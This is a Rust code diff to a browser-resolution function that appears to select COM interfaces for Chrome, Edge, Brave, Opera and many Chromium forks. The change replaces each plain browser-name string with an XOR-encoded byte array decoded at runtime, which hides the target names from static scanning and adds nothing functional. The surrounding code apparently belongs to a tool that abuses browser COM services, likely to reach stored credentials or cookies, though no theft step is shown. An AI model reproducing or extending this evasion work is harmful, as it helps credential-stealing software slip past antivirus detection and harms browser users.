@@ -424,40 +424,55 @@ fn generic_chromium_ref() -> &'static BrowserCom {
 pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
     let exe = exe_path.to_lowercase();
 
-    if exe.contains("brave") {
+    if contains_enc(&exe, &[0x38, 0x28, 0x3B, 0x2C, 0x3F]) {
         return all_browsers().iter().find(|b| b.name == s_brave());
     }
-    if exe.contains("msedge") || (exe.contains("edge") && !exe.contains("chrome")) {
+    if contains_enc(&exe, &[0x37, 0x29, 0x3F, 0x3E, 0x3D, 0x3F])
+        || (contains_enc(&exe, &[0x3F, 0x3E, 0x3D, 0x3F]) && !contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F]))
+    {
         return all_browsers().iter().find(|b| b.name == s_edge());
     }
-    if exe.contains("vivaldi") {
+    if contains_enc(&exe, &[0x2C, 0x33, 0x2C, 0x3B, 0x36, 0x3E, 0x33]) {
         return all_browsers().iter().find(|b| b.name == s_vivaldi());
     }
-    if exe.contains("opera") {
+    if contains_enc(&exe, &[0x15, 0x2A, 0x3F, 0x28, 0x3B]) {
         return all_browsers().iter().find(|b| b.name == s_opera());
     }
-    if exe.contains("yandex") {
+    if contains_enc(&exe, &[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22]) {
         return all_browsers().iter().find(|b| b.name == s_yandex());
     }
-    if exe.contains("coccoc") || exe.contains("360chrome") || exe.contains("epic")
-        || exe.contains("uran") || exe.contains("7star") || exe.contains("torch")
-        || exe.contains("kometa") || exe.contains("orbitum") || exe.contains("amigo")
-        || exe.contains("sputnik") || exe.contains("slimjet") || exe.contains("iridium")
-        || exe.contains("thorium") || exe.contains("centbrowser") || exe.contains("\\arc\\")
+    if contains_enc(&exe, &[0x39, 0x35, 0x39, 0x39, 0x35, 0x39])
+        || contains_enc(&exe, &[0x69, 0x6C, 0x6A, 0x39, 0x32, 0x28, 0x35, 0x37, 0x3F])
+        || contains_enc(&exe, &[0x3F, 0x2A, 0x33, 0x39])
+        || contains_enc(&exe, &[0x2F, 0x28, 0x3B, 0x34])
+        || contains_enc(&exe, &[0x6D, 0x29, 0x2E, 0x3B, 0x28])
+        || contains_enc(&exe, &[0x2E, 0x35, 0x28, 0x39, 0x32])
+        || contains_enc(&exe, &[0x31, 0x35, 0x37, 0x3F, 0x2E, 0x3B])
+        || contains_enc(&exe, &[0x35, 0x28, 0x38, 0x33, 0x2E, 0x37, 0x37])
+        || contains_enc(&exe, &[0x3B, 0x37, 0x33, 0x3D, 0x35])
+        || contains_enc(&exe, &[0x29, 0x2A, 0x2F, 0x2E, 0x34, 0x33, 0x31])
+        || contains_enc(&exe, &[0x29, 0x36, 0x33, 0x37, 0x30, 0x3F, 0x2E])
+        || contains_enc(&exe, &[0x2E, 0x32, 0x35, 0x28, 0x33, 0x37, 0x37])
+        || contains_enc(&exe, &[0x39, 0x3F, 0x34, 0x2E, 0x38, 0x28, 0x35, 0x3D, 0x29, 0x3F, 0x28])
+        || contains_enc(&exe, &[0x06, 0x3B, 0x28, 0x39, 0x06])
     {
         return Some(generic_chromium_ref());
     }
-    if exe.contains("chrome") {
-        if exe.contains("chrome sxs") || exe.contains("\\sxs\\") {
+    if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F]) {
+        if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x29, 0x22, 0x29])
+            || contains_enc(&exe, &[0x06, 0x29, 0x22, 0x29, 0x06])
+        {
             return all_browsers().iter().find(|b| b.name == s_chrome_canary());
         }
-        if exe.contains("chrome dev") {
+        if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x3E, 0x3F, 0x2C]) {
             return all_browsers().iter().find(|b| b.name == s_chrome_dev());
         }
-        if exe.contains("chrome beta") {
+        if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x38, 0x3F, 0x2E, 0x3B]) {
             return all_browsers().iter().find(|b| b.name == s_chrome_beta());
         }
-        if exe.contains("chromium") && !exe.contains("google") {
+        if contains_enc(&exe, &[0x39, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37])
+            && !contains_enc(&exe, &[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F])
+        {
             return Some(generic_chromium_ref());
         }
         return all_browsers().iter().find(|b| b.name == s_chrome());
@@ -466,7 +481,11 @@ pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
     None
 }
 
-// ============ Original COM code ============
+fn contains_enc(exe: &str, enc: &[u8]) -> bool {
+    exe.contains(&xor_str(enc))
+}
+
+fn guid_to_string(g: &GUID) -> String {
     format!(
         "{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
         g.data1, g.data2, g.data3,
@@ -474,6 +493,8 @@ pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
         g.data4[4], g.data4[5], g.data4[6], g.data4[7],
     )
 }
+
+// ============ Original COM code ============
 
 #[link(name = "ole32")]
 #[link(name = "oleaut32")]
